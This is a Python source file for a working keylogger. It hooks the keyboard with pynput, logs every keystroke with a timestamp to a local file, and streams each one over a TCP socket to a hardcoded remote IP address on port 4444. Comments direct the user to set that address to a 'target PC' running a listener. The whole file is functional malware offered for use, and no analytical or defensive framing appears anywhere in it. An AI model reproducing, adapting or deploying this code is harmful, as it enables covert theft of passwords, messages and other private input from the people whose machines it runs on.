import pynput.keyboard as keyboard
import socket
import time

# =============================================
# ⚙️ CONFIGURATION: CHANGE THESE VALUES
# =============================================
TARGET_IP = "88.192.127.87"  # <-- !!! REPLACE with your target PC's Public IP Address
TARGET_PORT = 4444          # <-- The port the listener script on the target PC is using
LOG_FILE = "keylog_output.txt" # Local file to save logs as a backup

# Initialize the socket client object
try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[+] Attempting to connect to {TARGET_IP}:{TARGET_PORT}...")
    client_socket.connect((TARGET_IP, TARGET_PORT))
    print("[SUCCESS] Connected! Keylogger is now active.")
except ConnectionRefusedError:
    print("="*60)
    print(f"[ERROR] Connection Refused!")
    print(f"Ensure a listener script is running on {TARGET_IP} on port {TARGET_PORT}.")
    client_socket = None # Set to None if connection fails immediately
except Exception as e:
    print(f"[FATAL ERROR] An unexpected error occurred during connection: {e}")
    client_socket = None

def send_log(key):
    """Handles the logging and sending of a single key event."""
    global client_socket
    
    # Determine what to log based on the key type
    if hasattr(key, 'char'):
        # It's a standard character key (a, b, 1, !, etc.)
        log_data = f"{key.char}"
    elif key == keyboard.Key.space:
        log_data = " "
    else:
        # It's a special key (Shift, Ctrl, Enter, etc.)
        if hasattr(key, 'name'):
            log_data = f"[{str(key).split('.')[-1].upper()}]"
        else:
             log_data = "[UNKNOWN_KEY]"

    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    full_log_entry = f"[{timestamp}] {log_data}"

    # 1. Log to local file (Backup)
    with open(LOG_FILE, "a") as f:
        f.write(full_log_entry + "\n")

    # 2. Send over network (If connected)
    if client_socket:
        try:
            # Encode the string to bytes before sending
            client_socket.send(full_log_entry.encode('utf-8'))
        except BrokenPipeError:
            print("\n[!] Connection Lost! Attempting to re-establish connection...")
            # In a real scenario, you would implement a reconnection loop here
            pass 

def on_press(key):
    """Callback function executed when a key is pressed."""
    send_log(key)

def on_release(key):
    """Callback function executed when a key is released (optional)."""
    # You can add logic here, like stopping the logger with a specific key
    if key == keyboard.Key.esc:
        print("\n[INFO] Escape key pressed. Stopping Keylogger...")
        return False # Returning False stops the listener thread

# =============================================
# 🚀 MAIN EXECUTION BLOCK
# =============================================
if __name__ == "__main__":
    if client_socket:
        # Set up the keyboard listener
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        
        try:
            # Start listening in a non-blocking thread
            listener.start()
            
            # Keep the main program running indefinitely until the listener stops itself (via ESC key)
            while listener.is_alive():
                time.sleep(0.1)

        except KeyboardInterrupt:
            print("\n[INFO] Ctrl+C detected. Stopping Keylogger...")
        finally:
            # Ensure the listener thread is cleanly stopped and resources are released
            listener.stop()
            client_socket.close()
            print("[SUCCESS] Resources cleaned up. Exiting.")

